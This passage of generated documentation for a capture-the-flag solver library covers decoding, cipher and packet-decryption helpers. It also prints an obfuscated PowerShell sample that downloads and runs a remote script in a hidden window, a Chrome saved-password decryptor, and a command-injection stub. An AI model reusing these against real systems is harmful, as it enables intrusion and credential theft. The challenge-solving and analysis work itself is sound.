        syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
        # Correct error if syndrome != 0
        if syndrome != 0:
            error_pos = syndrome - 1  # zero-based index
            bits7[error_pos] ^= 1
            # Reassign corrected bits
            p1, p2, d1, p3, d2, d3, d4 = bits7
        # Extract data bits
        return [d1, d2, d3, d4]

    bits = list(map(int, encoded_bits))
    if len(bits) % 7 != 0:
        raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
    decoded_bits = []
    for i in range(0, len(bits), 7):
        block = bits[i : i + 7]
        data_bits = hamming_correct_and_extract(block)
        decoded_bits.extend(data_bits)
    return self.bits_to_ascii(decoded_bits)</code></pre>
</details>
<div class="desc"><p>Decode a Hamming (7,4) encoded bit string to ASCII.
Each 7 bits contain 4 data bits and 3 parity bits.
Returns ASCII decoded string.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decode_manchester"><code class="name flex">
<span>def <span class="ident">decode_manchester</span></span>(<span>self, encoded_bits)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decode_manchester(self, encoded_bits):
    &#34;&#34;&#34;
    Decode Manchester encoded bit string to ASCII.
    Manchester encoding: each bit is two bits:
    &#39;01&#39; -&gt; 0
    &#39;10&#39; -&gt; 1
    &#34;&#34;&#34;
    bits = encoded_bits
    if len(bits) % 2 != 0:
        raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
    decoded_bits = []
    for i in range(0, len(bits), 2):
        pair = bits[i : i + 2]
        if pair == &#34;01&#34;:
            decoded_bits.append(0)
        elif pair == &#34;10&#34;:
            decoded_bits.append(1)
        else:
            raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
    return self.bits_to_ascii(decoded_bits)</code></pre>
</details>
<div class="desc"><p>Decode Manchester encoded bit string to ASCII.
Manchester encoding: each bit is two bits:
'01' -&gt; 0
'10' -&gt; 1</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decode_nrz_i"><code class="name flex">
<span>def <span class="ident">decode_nrz_i</span></span>(<span>self, bits:str) >str</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decode_nrz_i(self, bits: str) -&gt; str:
    # result = &#34;&#34;
    # current = &#34;0&#34;
    # for bit in bits:
    #     if bit == &#34;1&#34;:
    #         # toggle the signal
    #         current = &#34;1&#34; if current == &#34;0&#34; else &#34;0&#34;
    #     # bit == &#34;0&#34; means no change
    #     result += current
    # return result
    &#34;&#34;&#34;
    Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
    In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
    and no transition represents a 0.
    &#34;&#34;&#34;
    if not bits:
        return &#34;&#34;

    decoded = []
    prev_bit = &#34;1&#34;  # Start with high voltage as reference

    for bit in bits:
        if bit == prev_bit:
            decoded.append(&#34;0&#34;)
        else:
            decoded.append(&#34;1&#34;)
        prev_bit = bit

    return &#34;&#34;.join(decoded)</code></pre>
</details>
<div class="desc"><p>Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
and no transition represents a 0.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decode_nrzi"><code class="name flex">
<span>def <span class="ident">decode_nrzi</span></span>(<span>self, bits:str) >str</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decode_nrzi(self, bits: str) -&gt; str:
    &#34;&#34;&#34;
    Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
    In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
    and no transition represents a 0.
    &#34;&#34;&#34;

    # Convert string to list of ints
    encoded_bits = list(map(int, bits))
    # Initial signal level
    current_level = encoded_bits[0]
    decoded_bits = []
    decoded_bits.append(current_level)
    for i in range(1, len(encoded_bits)):
        if encoded_bits[i] == 1:
            # Transition: invert current level
            current_level = 1 - current_level
        # else no transition, current_level stays the same
        decoded_bits.append(current_level)
    # Now decoded_bits is the original bit stream
    # print(f&#34;Decoded NRZI bits: {decoded_bits}&#34;)
    # print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
    # decoded_bits = self.nrzi_formater(decoded_bits)
    return self.bits_to_ascii(decoded_bits)</code></pre>
</details>
<div class="desc"><p>Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
and no transition represents a 0.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decode_uart"><code class="name flex">
<span>def <span class="ident">decode_uart</span></span>(<span>self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decode_uart(
    self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
):
    &#34;&#34;&#34;
    Decode UART encoded bit string to ASCII.
    Assumes:
    - 1 start bit (0)
    - 8 data bits (LSB first)
    - 1 parity by default
    - 1 stop bit (1)
    encoded_bits is a string of bits representing UART frames concatenated.
    &#34;&#34;&#34;
    bits = list(map(int, encoded_bits))
    frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
    if len(bits) % frame_len != 0:
        raise ValueError(
            &#34;UART encoded bits length is not a multiple of frame length&#34;
        )
    decoded_chars = []
    for i in range(0, len(bits), frame_len):
        frame = bits[i : i + frame_len]
        start_bit = frame[0]
        if start_bit != 0:
            raise ValueError(&#34;Invalid start bit in UART frame&#34;)
        data = frame[1 : 1 + data_bits]
        # Parity check skipped if parity is None
        # Stop bits check
        stop = frame[1 + data_bits + (1 if parity else 0) :]
        if any(s != 1 for s in stop):
            raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
        # Convert data bits (LSB first) to int
        val = 0
        for idx, bit in enumerate(data):
            val |= bit &lt;&lt; idx
        decoded_chars.append(chr(val))
    return &#34;&#34;.join(decoded_chars)</code></pre>
</details>
<div class="desc"><p>Decode UART encoded bit string to ASCII.
Assumes:
- 1 start bit (0)
- 8 data bits (LSB first)
- 1 parity by default
- 1 stop bit (1)
encoded_bits is a string of bits representing UART frames concatenated.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decoding"><code class="name flex">
<span>def <span class="ident">decoding</span></span>(<span>self, crypted_dict, data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decoding(self, crypted_dict, data):

    decoded = &#34;&#34;
    for c in data:
        if c in crypted_dict.keys() and crypted_dict[c] != &#34;&#34;:
            decoded += crypted_dict[c]
        else:
            decoded += c
    return decoded</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decrypt"><code class="name flex">
<span>def <span class="ident">decrypt</span></span>(<span>self, cipher_list, key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decrypt(self, cipher_list, key):
    plaintext = []
    for char in cipher_list:
        plaintext.append(chr(int(char / key / 311)))
    return plaintext</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decrypt_password"><code class="name flex">
<span>def <span class="ident">decrypt_password</span></span>(<span>self, ciphertext, secret_key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decrypt_password(self, ciphertext, secret_key):
    try:
        # (3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # (4) Build the cipher to decrypt the ciphertext
        cipher = self.generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print(&#34;%s&#34; % str(e))
        print(
            &#34;[ERR] Unable to decrypt, Chrome version &lt;80 not supported. Please check.&#34;
        )
        return &#34;&#34;</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decrypt_payload"><code class="name flex">
<span>def <span class="ident">decrypt_payload</span></span>(<span>self, cipher, payload)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decrypt_payload(self, cipher, payload):
    return cipher.decrypt(payload)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decrypt_string"><code class="name flex">
<span>def <span class="ident">decrypt_string</span></span>(<span>self, encrypted_base64, key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decrypt_string(self, encrypted_base64, key):
    full_data = base64.b64decode(encrypted_base64)

    iv = full_data[: AES.block_size]
    encrypted_message = full_data[AES.block_size :]

    cipher = AES.new(key, AES.MODE_CBC, iv)

    decrypted_bytes = cipher.decrypt(encrypted_message)

    pad = decrypted_bytes[-1]
    decrypted_bytes = decrypted_bytes[:-pad]

    return decrypted_bytes.decode(&#34;utf-8&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decrypting_packet"><code class="name flex">
<span>def <span class="ident">decrypting_packet</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decrypting_packet(self):
    &#34;&#34;&#34;
    Description:
        Challenge specific function
    &#34;&#34;&#34;
    # packet_data_path = self.folfil(&#34;data&#34;, &#34;packet_1.data&#34;)

    ending_number = 79

    for num in range(78, ending_number + 1):
        packet_data_path = self.folfil(&#34;data&#34;, f&#34;packet_{num}.data&#34;)

        with open(packet_data_path, &#34;rb&#34;) as f:
            packet_data = f.read()

        decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
        print(f&#34;Packet {num} :&#34;)
        print(decrypted_data)</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Challenge specific function</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decrypting_stream_4"><code class="name flex">
<span>def <span class="ident">decrypting_stream_4</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decrypting_stream_4(self):
    &#34;&#34;&#34;
    Description:
        Challenge specific function
    &#34;&#34;&#34;

    stream_4 = self.custom_stream_extract(stream_num=4)

    # print(list(stream_4.keys())[0])
    # # print(stream_4[list(stream_4.keys())[0]].show())

    

    start = 94
    end = 997
    encrypted_data = b&#34;&#34;

    for i, packet in stream_4.items():
        if (
            i &lt; start
            or i &gt; end
            or hasattr(packet, &#34;load&#34;) is False
            or packet[IP].src != &#34;172.31.47.152&#34;
        ):
            continue

        encrypted_data += packet.load

    try:
        decrypted_data = self.dec_file_mes(encrypted_data, self.encryption_key)
        print(f&#34;Packet {i} :&#34;)
        with open(self.folfil(&#34;data&#34;, &#34;decrypted_data&#34;), &#34;wb&#34;) as f:
            f.write(decrypted_data)
        print(decrypted_data)
    except Exception as e:
        print(f&#34;packet {i} : {e}&#34;)</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Challenge specific function</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decrypting_vigenere"><code class="name flex">
<span>def <span class="ident">decrypting_vigenere</span></span>(<span>self, ciphertext, key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decrypting_vigenere(self, ciphertext, key):
    key = key.lower()
    plaintext = &#34;&#34;
    for i, ch in enumerate(ciphertext):
        if ch.isalpha():
            nch = ord(ch) - 97
            nk = ord(key[i % len(key)]) - 97
            plaintext += chr((nch - nk + 26) % 26 + 97)
        else:
            plaintext += ch
    return plaintext</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.demarshalling"><code class="name flex">
<span>def <span class="ident">demarshalling</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def demarshalling(self):
    &#34;&#34;&#34;
    Description:
        This function is used to demarshall the compressed data and display the disassembled code.
        Challenge specific function
    &#34;&#34;&#34;
    self.load_compressed_data()
    data = bz2.decompress(self.compressed_data)
    code = marshal.loads(data)

    print(dis.dis(code))</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>This function is used to demarshall the compressed data and display the disassembled code.
Challenge specific function</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.deobfuscation"><code class="name flex">
<span>def <span class="ident">deobfuscation</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def deobfuscation(self):

    latifoliado = &#34;U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe&#34;

    latifoliado = (
        latifoliado
        + &#34;XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl&#34;
    )
    latifoliado = (
        latifoliado
        + &#34;uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc&#34;
    )
    latifoliado = latifoliado + &#34;CcpKSkpd2FudGVkCgd2FudGVkCg&#34;

    parrana = &#34;d2FudGVkCg&#34;

    arran = &#34; d2FudGVkCg d2FudGVkCg &#34;
    arran = arran + &#34;$d2FudGVkCgCod2FudGVkCgd&#34;
    arran = arran + &#34;id2FudGVkCggod2FudGVkCg &#34;
    arran = arran + &#34;d2FudGVkCg&#34; + latifoliado + &#34;d2FudGVkCg&#34;
    arran = arran + &#34;$d2FudGVkCgOWd2FudGVkCgj&#34;
    arran = arran + &#34;ud2FudGVkCgxdd2FudGVkCg &#34;
    arran = arran + &#34;=d2FudGVkCg [d2FudGVkCgs&#34;
    arran = arran + &#34;yd2FudGVkCgstd2FudGVkCge&#34;
    arran = arran + &#34;md2FudGVkCg.Td2FudGVkCge&#34;
    arran = arran + &#34;xd2FudGVkCgt.d2FudGVkCge&#34;
    arran = arran + &#34;nd2FudGVkCgcod2FudGVkCgd&#34;
    arran = arran + &#34;id2FudGVkCgngd2FudGVkCg]&#34;
    arran = arran + &#34;:d2FudGVkCg:Ud2FudGVkCgT&#34;
    arran = arran + &#34;Fd2FudGVkCg8.d2FudGVkCgG&#34;
    arran = arran + &#34;ed2FudGVkCgtSd2FudGVkCgt&#34;
    arran = arran + &#34;rd2FudGVkCgind2FudGVkCgg&#34;
    arran = arran + &#34;(d2FudGVkCg[sd2FudGVkCgy&#34;
    arran = arran + &#34;sd2FudGVkCgted2FudGVkCgm&#34;
    arran = arran + &#34;.d2FudGVkCgCod2FudGVkCgn&#34;
    arran = arran + &#34;vd2FudGVkCgerd2FudGVkCgt&#34;
    arran = arran + &#34;]d2FudGVkCg::d2FudGVkCgF&#34;
    arran = arran + &#34;rd2FudGVkCgomd2FudGVkCgb&#34;
    arran = arran + &#34;ad2FudGVkCgsed2FudGVkCg6&#34;
    arran = arran + &#34;4d2FudGVkCgStd2FudGVkCgr&#34;
    arran = arran + &#34;id2FudGVkCgngd2FudGVkCg(&#34;
    arran = arran + &#34;$d2FudGVkCgcod2FudGVkCgd&#34;
    arran = arran + &#34;id2FudGVkCggod2FudGVkCg)&#34;
    arran = arran + &#34;)d2FudGVkCg;pd2FudGVkCgo&#34;
    arran = arran + &#34;wd2FudGVkCgerd2FudGVkCgs&#34;
    arran = arran + &#34;hd2FudGVkCgeld2FudGVkCgl&#34;
    arran = arran + &#34;.d2FudGVkCgexd2FudGVkCge&#34;
    arran = arran + &#34; d2FudGVkCg-wd2FudGVkCgi&#34;
    arran = arran + &#34;nd2FudGVkCgdod2FudGVkCgw&#34;
    arran = arran + &#34;sd2FudGVkCgtyd2FudGVkCgl&#34;
    arran = arran + &#34;ed2FudGVkCg hd2FudGVkCgi&#34;
    arran = arran + &#34;dd2FudGVkCgded2FudGVkCgn&#34;
    arran = arran + &#34; d2FudGVkCg-ed2FudGVkCgx&#34;
    arran = arran + &#34;ed2FudGVkCgcud2FudGVkCgt&#34;
    arran = arran + &#34;id2FudGVkCgond2FudGVkCgp&#34;
    arran = arran + &#34;od2FudGVkCglid2FudGVkCgc&#34;
    arran = arran + &#34;yd2FudGVkCg bd2FudGVkCgy&#34;
    arran = arran + &#34;pd2FudGVkCgasd2FudGVkCgs&#34;
    arran = arran + &#34; d2FudGVkCg-Nd2FudGVkCgo&#34;
    arran = arran + &#34;Pd2FudGVkCgrod2FudGVkCgf&#34;
    arran = arran + &#34;id2FudGVkCgled2FudGVkCg &#34;
    arran = arran + &#34;-d2FudGVkCgcod2FudGVkCgm&#34;
    arran = arran + &#34;md2FudGVkCgand2FudGVkCgd&#34;
    arran = arran + &#34; d2FudGVkCg$Od2FudGVkCgW&#34;
    arran = arran + &#34;jd2FudGVkCguxd2FudGVkCgD&#34;

    return arran</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.derive_key_and_iv"><code class="name flex">
<span>def <span class="ident">derive_key_and_iv</span></span>(<span>self, password, salt, key_length, iv_length)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def derive_key_and_iv(self, password, salt, key_length, iv_length):
    d = SHA256.new()
    d.update(password.encode(&#34;utf-8&#34;))
    key = d.digest()[:key_length]
    iv = salt.encode(&#34;utf-8&#34;)[:iv_length]
    return key, iv</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.des_key_generator"><code class="name flex">
<span>def <span class="ident">des_key_generator</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def des_key_generator(self):
    &#34;&#34;&#34;
    Generator for all possible 8-byte DES keys.
    DES uses a 56-bit key space, padded to 8 bytes.
    &#34;&#34;&#34;
    for key in range(2**64):
        # Convert the 56-bit key to an 8-byte key
        key_bytes = key.to_bytes(8, byteorder=&#34;big&#34;)
        yield key_bytes</code></pre>
</details>
<div class="desc"><p>Generator for all possible 8-byte DES keys.
DES uses a 56-bit key space, padded to 8 bytes.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.dictionary_analysis"><code class="name flex">
<span>def <span class="ident">dictionary_analysis</span></span>(<span>self, lyrics)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def dictionary_analysis(self, lyrics):
    d = defaultdict(list)
    for i, c in enumerate(lyrics):
        d[c].append(i)
    return d</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.differ"><code class="name flex">
<span>def <span class="ident">differ</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def differ(self):
    self.list_1_file = self.folfil(&#34;files&#34;, &#34;list.txt&#34;)
    self.list_2_file = self.folfil(&#34;files&#34;, &#34;html_list_2.txt&#34;)

    # Read the first list
    with open(self.list_1_file, &#34;r&#34;) as f:
        self.list_1 = f.read().splitlines()

    # Read the second list
    with open(self.list_2_file, &#34;r&#34;) as f:
        self.list_2 = f.read().splitlines()

    # Get the difference between the two lists
    diff = list(set(self.list_1) - set(self.list_2))
    # Print the difference
    print(diff)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.download_images"><code class="name flex">
<span>def <span class="ident">download_images</span></span>(<span>self, name)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def download_images(self, name):
    url = f&#34;{self.url}:{self.port}/flags/{name}.png&#34;
    try:
        response = requests.get(url)
        if response.status_code == 200:
            flags_path = self.folfil(&#34;files&#34;, &#34;flags&#34;)
            file_path = self.Path(flags_path, f&#34;{name}.png&#34;)
            with open(file_path, &#34;wb&#34;) as f:
                f.write(response.content)
            print(f&#34;Downloaded {name}.png&#34;)
        else:
            print(f&#34;Error downloading {name}.png&#34;)
    except Exception as e:
        print(f&#34;Error downloading {name}.png&#34;)
        print(e)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.downloading"><code class="name flex">
<span>def <span class="ident">downloading</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def downloading(self):
    if not hasattr(self, &#34;meme_url&#34;):
        print(&#34;Meme not generated. Please run the generating step first.&#34;)
        return
    response = requests.get(self.meme_url)
    meme_name = self.meme.split(&#34;/&#34;)[-1]
    if response.status_code == 200:
        with open(self.folfil(&#34;data&#34;, meme_name), &#34;wb&#34;) as f:
            f.write(response.content)
        print(&#34;Meme downloaded successfully.&#34;)
    else:
        print(&#34;Failed to download the meme.&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.dynamic_xor_decrypt"><code class="name flex">
<span>def <span class="ident">dynamic_xor_decrypt</span></span>(<span>self, plaintext, text_key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def dynamic_xor_decrypt(self, plaintext, text_key):
    cipher_text = &#34;&#34;
    key_length = len(text_key)
    for i, char in enumerate(plaintext):
        key_char = text_key[i % key_length]
        encrypted_char = chr(ord(char) ^ ord(key_char))
        cipher_text += encrypted_char
    return cipher_text</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.dynamic_xor_encrypt"><code class="name flex">
<span>def <span class="ident">dynamic_xor_encrypt</span></span>(<span>self, plaintext, text_key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def dynamic_xor_encrypt(self, plaintext, text_key):
    cipher_text = &#34;&#34;
    key_length = len(text_key)
    for i, char in enumerate(plaintext[::-1]):
        key_char = text_key[i % key_length]
        encrypted_char = chr(ord(char) ^ ord(key_char))
        cipher_text += encrypted_char
    return cipher_text</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.emilia_main"><code class="name flex">
<span>def <span class="ident">emilia_main</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def emilia_main(self):

    # Key from $a53Va (known good key)
    # NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==
    key1_b64 = &#34;NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==&#34;
    key1 = base64.b64decode(key1_b64)
    # key1 = base64.b64decode(key1)

    # Read the encrypted .secured file (Base64-encoded)
    with open(self.challenge_file, &#34;rb&#34;) as f:

        encrypted_b64 = bytearray(f.read())

    encrypted_data = base64.b64decode(encrypted_b64)

    # Try decrypting with single key
    decrypted_data_1 = self.xor_decrypt(encrypted_data, key1)

    # Try decrypting with both keys (if key2 is usable)
    # So one key is weird because in the powershell script it tried to decode it with UTF-8 and i think that would lead to an error
    # So there is a chance that only one key is used due to the try-catch brackets leaving one key null but im not sure.
    key2_str = &#34;n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ&#34;

    try:
        key2 = base64.b64decode(key2_str)
        decrypted_data_2 = self.xor_decrypt(encrypted_data, key1, key2)
    except Exception as e:
        print(f&#34;[!] Dual-key decode failed: {e}&#34;)
        decrypted_data_2 = None

    # Save both outputs as .bin files for analysis
    output_single_key = self.folfil(&#34;data&#34;, &#34;output_single_key.bin&#34;)
    with open(output_single_key, &#34;wb&#34;) as f:
        f.write(decrypted_data_1)
        print(&#34;[+] Decrypted with single key -&gt; output_single_key.bin&#34;)

    if decrypted_data_2:
        output_dual_key = self.folfil(&#34;data&#34;, &#34;output_dual_key.bin&#34;)
        with open(output_dual_key, &#34;wb&#34;) as f:

            f.write(decrypted_data_2)
            print(&#34;[+] Decrypted with both keys -&gt; output_dual_key.bin&#34;)

    key3_b64 = &#34;5xsGObjHQiPAGdzLgBEeI8u0YSJq76Eiyuf8wARS7qbtP4ntQY50yH8dzKZeCAsZn2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ&#34;
    key3 = base64.b64decode(key3_b64)
    decrypted_data_3 = self.xor_decrypt(encrypted_data, key3)
    output_join_key = self.folfil(&#34;data&#34;, &#34;output_join_key.bin&#34;)
    with open(output_join_key, &#34;wb&#34;) as f:
        f.write(decrypted_data_3)
        print(&#34;[+] Decrypted with join key -&gt; output_join.bin&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.encode_nrzi"><code class="name flex">
<span>def <span class="ident">encode_nrzi</span></span>(<span>self, bits:str, verbose=False) >str</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def encode_nrzi(self, bits: str, verbose=False) -&gt; str:
    &#34;&#34;&#34;
    Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
    In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
    and no transition represents a 0.
    &#34;&#34;&#34;

    # Convert string to list of ints
    encoded_bits = list(map(int, bits))
    # Initial signal level
    # current_level = encoded_bits[0]
    current_level = encoded_bits[0]
    decoded_bits = []
    decoded_bits.append(current_level)
    for i in range(1, len(encoded_bits)):
        if encoded_bits[i] == 1:
            # Transition: invert current level
            current_level = 1 - current_level
            # current_level ^= 1
        # else no transition, current_level stays the same
        decoded_bits.append(current_level)
    # Now decoded_bits is the original bit stream
    # print(f&#34;Decoded NRZI bits: {decoded_bits}&#34;)
    if verbose:
        print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
    # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
    # return self.bits_to_ascii(decoded_bits)
    return self.nrzi_to_ascii(decoded_bits)</code></pre>
</details>
<div class="desc"><p>Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
and no transition represents a 0.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.encrypt"><code class="name flex">
<span>def <span class="ident">encrypt</span></span>(<span>self, plaintext, key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def encrypt(self, plaintext, key):
    cipher = []
    for char in plaintext:
        cipher.append(((ord(char) * key * 311)))
    return cipher</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.evtx_open"><code class="name flex">
<span>def <span class="ident">evtx_open</span></span>(<span>self, file, func, *args, **kwargs)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def evtx_open(self, file, func, *args, **kwargs):
    with evtx.Evtx(file) as log_file:
        func(log_file, file, *args, **kwargs)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.exec_fmt"><code class="name flex">
<span>def <span class="ident">exec_fmt</span></span>(<span>self, payload)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def exec_fmt(self, payload):
    p = CTFSolver(conn=self.conn_type, file=self.file, url=self.url, port=self.port)
    p.initiate_connection()
    p.conn.sendline(payload)
    return p.conn.recvall()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.exec_func"><code class="name flex">
<span>def <span class="ident">exec_func</span></span>(<span>self, payload)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def exec_func(self, payload):
    p = Solution(conn=&#34;local&#34;, file=self.file)
    p.initiate_connection()
    p.conn.sendline(payload)
    p.conn.recvline()
    p.conn.recvline()
    res = p.conn.recvline()
    print(res)
    return res.strip()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.exploit"><code class="name flex">
<span>def <span class="ident">exploit</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def exploit(self):
    # 3) Exploit: call get_current_time with injection
    # Note: no literal spaces allowed, so we use ${IFS} to stand in for a space.
